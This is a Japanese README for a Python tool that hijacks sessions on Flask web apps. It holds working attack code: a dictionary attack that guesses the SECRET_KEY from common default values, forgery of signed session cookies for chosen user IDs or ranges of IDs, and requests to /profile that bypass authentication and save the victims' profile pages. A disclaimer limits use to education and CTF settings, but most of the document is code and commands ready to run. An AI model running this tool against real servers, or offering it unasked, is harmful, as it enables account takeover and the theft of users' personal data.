# セッションハイジャックツール

指定したWEBサーバーに対してセッションハイジャックを実行し、SECRET_KEYを辞書攻撃で見つけるPythonツールです。

## 注意事項

⚠️ **このツールは教育目的および許可された環境でのみ使用してください。**
- 許可されていないサーバーに対する攻撃は違法です
- 自分のサーバーやCTF（Capture The Flag）などの許可された環境でのみ使用してください

## インストール

```bash
pip install -r requirements.txt
```

## 主な機能

### 1. SECRET_KEYの辞書攻撃
- デフォルトのSECRET_KEY候補リストを使用した自動攻撃
- 実際のHTTPリクエストでSECRET_KEYを検証
- 各候補を順次試行し、正しいSECRET_KEYを特定

### 2. セッションデータの偽造
- `_user_id`, `_fresh`, `_id`を含むセッションデータの生成
- 指定したユーザーIDでのセッション偽造
- Flaskの`SecureCookieSessionInterface`を使用した署名付きセッションクッキーの生成

### 3. プロフィールページへのアクセス
- 偽造したセッションクッキーを使用して`/profile`エンドポイントにアクセス
- 認証バイパスの成功/失敗を判定
- 成功した場合、HTMLをファイルに保存

### 4. 複数ユーザーIDのサポート
- 単一のユーザーIDまたは範囲（例: `1-5`）を指定可能
- 各ユーザーIDに対して個別にセッションハイジャックを実行
- 各ユーザーIDごとにHTMLファイルを保存

### 5. 詳細なログ出力
- 各ステップの進行状況を表示
- セッションデータの内容を表示
- 生成されたセッションクッキーの表示
- アクセス結果の詳細な表示

## 使用方法

### 基本的な使用方法

```bash
python 001session_hijack.py -u http://localhost:5000
```

### 特定のユーザーIDを指定

```bash
python 001session_hijack.py -u http://localhost:5000 -i 2
```

### ユーザーIDの範囲を指定

```bash
python 001session_hijack.py -u http://localhost:5000 -i 1-5
```

## オプション

- `-u, --url`: ターゲットURL（必須）
- `-i`: 攻撃対象のユーザーID（オプション、デフォルト: 1）。範囲指定可（例: 1-5）

## 動作原理

1. **コマンドライン引数の解析**: `argparse`を使用してターゲットURLとユーザーIDを取得
2. **ユーザーIDの範囲解析**: `-i`オプションで指定された範囲（例: `1-5`）をパースしてリストに変換
3. **SECRET_KEYの辞書攻撃**: デフォルトのSECRET_KEY候補リストを順次試行し、実際のHTTPリクエストで検証
4. **セッションデータの偽造**: `_user_id`, `_fresh`, `_id`を含む偽造セッションデータを生成
5. **Flaskセッションクッキーの生成**: `SecureCookieSessionInterface`を使用して署名付きのセッションクッキーを生成
6. **プロフィールページへのアクセス**: 偽造したセッションクッキーを使用して`/profile`エンドポイントにアクセス
7. **結果の判定**: レスポンスのステータスコードと内容を確認し、認証バイパスの成功/失敗を判定
8. **HTMLの保存**: 成功した場合、プロフィールページのHTMLを`profile_page_user_{id}.html`として保存

## コード解説

### 1. コマンドライン引数の解析（6-27行目）

```python
parser = argparse.ArgumentParser(
    description='WEBサーバーに対するセッションハイジャックツール',
    formatter_class=argparse.RawDescriptionHelpFormatter,
    epilog="""使用例: ..."""
)
parser.add_argument('-u', '--url', required=True, help='ターゲットURL（必須）')
parser.add_argument('-i', dest='user_id', default='1', help='攻撃対象のユーザーID（デフォルト: 1）。範囲指定可（例: 1-2）')
```

`argparse`を使用してコマンドライン引数を解析します。`-u`（または`--url`）は必須で、`-i`でユーザーIDを指定できます。

### 2. ユーザーIDの範囲解析（32-48行目）

```python
def parse_user_ids(user_id_str):
    """ユーザーID文字列をパースしてリストを返す（範囲指定に対応）"""
    if '-' in user_id_str:
        # 範囲指定（例: 1-2）
        start, end = user_id_str.split('-', 1)
        start = int(start.strip())
        end = int(end.strip())
        if start > end:
            start, end = end, start
        return [str(i) for i in range(start, end + 1)]
    else:
        # 単一のID
        return [user_id_str]
```

`-i`オプションで指定された文字列を解析します。`1-5`のような範囲指定の場合は、`['1', '2', '3', '4', '5']`のようなリストに変換します。

### 3. SECRET_KEYの辞書攻撃（78-123行目）

```python
for secret_key in SECRET_KEYS:
    # Flaskアプリケーションを作成してセッションシリアライザーを取得
    app = Flask(__name__)
    app.config['SECRET_KEY'] = secret_key
    session_interface = app.session_interface
    serializer = session_interface.get_signing_serializer(app)
    
    # セッションクッキーを生成
    test_cookie = serializer.dumps(test_fake_session)
    
    # テスト用のセッションを作成
    test_session = requests.Session()
    test_session.cookies.set('session', test_cookie)
    
    # プロフィールページにアクセスしてテスト
    test_response = test_session.get(f'{target_url}/profile', allow_redirects=False)
    
    # 成功の判定
    if test_response.status_code == 200:
        if 'ログイン' not in test_response.text or ('プロフィール' in test_response.text and 'ユーザー名' in test_response.text):
            is_success = True
```

各SECRET_KEY候補に対して、実際にFlaskアプリケーションを作成し、セッションクッキーを生成してHTTPリクエストで検証します。ステータスコード200でログインページ以外が返された場合、そのSECRET_KEYが正しいと判定します。

### 4. セッションデータの偽造（144-149行目）

```python
fake_session = {
    "_user_id": user_id,
    "_fresh": True,
    "_id": user_id
}
```

Flaskのセッションデータ構造に合わせて、`_user_id`、`_fresh`、`_id`を含む辞書を作成します。これがセッションクッキーにエンコードされます。

### 5. Flaskセッションクッキーの生成（132-136行目、151-152行目）

```python
app = Flask(__name__)
app.config['SECRET_KEY'] = used_secret_key
session_interface = app.session_interface
serializer = session_interface.get_signing_serializer(app)

fake_cookie = serializer.dumps(fake_session)
```

Flaskの`SecureCookieSessionInterface`を使用して、セッションデータを署名付きのセッションクッキーにエンコードします。これにより、サーバーが検証可能な有効なセッションクッキーが生成されます。

### 6. プロフィールページへのアクセス（168-183行目）

```python
session = requests.Session()
session.cookies.set('session', fake_cookie)

response = session.get(f'{target_url}/profile', allow_redirects=False)
```

偽造したセッションクッキーを`requests.Session`に設定し、プロフィールページにアクセスします。`allow_redirects=False`にすることで、リダイレクトの挙動を確認できます。

### 7. 成功判定とHTMLの保存（186-201行目）

```python
if response.status_code == 200:
    if "プロフィール" in response.text and "ユーザー名" in response.text:
        print("[+] 攻撃成功: 認証をバイパスしました")
        
        # HTML情報をtxtファイルに出力
        output_filename = f"profile_page_user_{user_id}.html"
        with open(output_filename, 'w', encoding='utf-8') as f:
            f.write(response.text)
```

ステータスコード200で、かつレスポンス本文に「プロフィール」と「ユーザー名」が含まれている場合、攻撃成功と判定します。成功した場合、HTMLを`profile_page_user_{id}.html`として保存します。

## 対応フレームワーク

- Flask（`SecureCookieSessionInterface`を使用）

## デフォルトのSECRET_KEY候補

コード内で定義されているデフォルトのSECRET_KEY候補リスト：

```python
SECRET_KEYS = [
    "secret",
    "secret-key",
    "testkey",
    "ecre-key",
    "your-secret-key-change-in-production",
    "secret-keys",
]
```

これらの候補を順次試行し、実際のHTTPリクエストで検証します。

## ライセンス

教育目的のみ。使用は自己責任でお願いします。

